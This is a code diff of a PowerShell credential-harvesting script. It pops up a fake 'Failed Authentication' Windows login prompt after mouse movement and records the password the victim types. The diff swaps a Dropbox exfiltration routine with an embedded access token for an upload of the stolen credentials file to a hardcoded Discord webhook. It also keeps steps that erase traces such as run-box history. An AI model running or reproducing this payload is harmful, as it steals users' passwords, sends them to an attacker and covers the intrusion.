@@ -1,24 +1,17 @@
-﻿#------------------------------------------------------------------------------------------------------------------------------------
 
-$DropBoxAccessToken = "sl.Brv_a6pZTz7W-szDfziGQnMxZfGdJltWWzUndUFipcNOlhFT9QDAiIaOXOJSbaw2puac9XWYoOn8fYMWvGIOHOEKxH2Hkn-XNENlInH2tkfFsRwXGxCOIsM8BKNQOp7E2lwVT58tzEaz"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$FileName = "User-Creds.txt"
  
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to generate the ui.prompt you will use to harvest their credentials
-#>
 
 function Get-Creds {
 do{
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
    if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
+    [System.Windows.Forms.MessageBox]::Show("Invalid Password")
     Get-Creds
 }
 $creds = $cred.GetNetworkCredential() | fl
@@ -31,12 +24,6 @@ return $creds
 }
 
 #----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
-#>
 
 function Pause-Script{
 Add-Type -AssemblyName System.Windows.Forms
@@ -56,8 +43,6 @@ $o=New-Object -ComObject WScript.Shell
 
 #----------------------------------------------------------------------------------------------------
 
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
-
 function Caps-Off {
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
@@ -71,11 +56,6 @@ $key.SendKeys('{CapsLock}')
 }
 #----------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
-#>
 
 Pause-Script
 
@@ -89,43 +69,37 @@ $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
 
-.NOTES 
-	This is to save the gathered credentials to a file in the temp directory
-#>
+echo $creds >> $env:USERPROFILE\$FileName
 
-echo $creds >> $env:TMP\$FileName
+
+
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = 'https://discord.com/api/webhooks/1183181478645997698/bmS94RKPMhnfSInRJZ2fu_0zctdvhRXi1wTj5lfbJ91jVEehz90MGk09DWKP12iyJMQQ'
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+Upload-Discord -file "User-Creds.txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to upload your files to dropbox
-#>
-
-$TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
-
-# Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
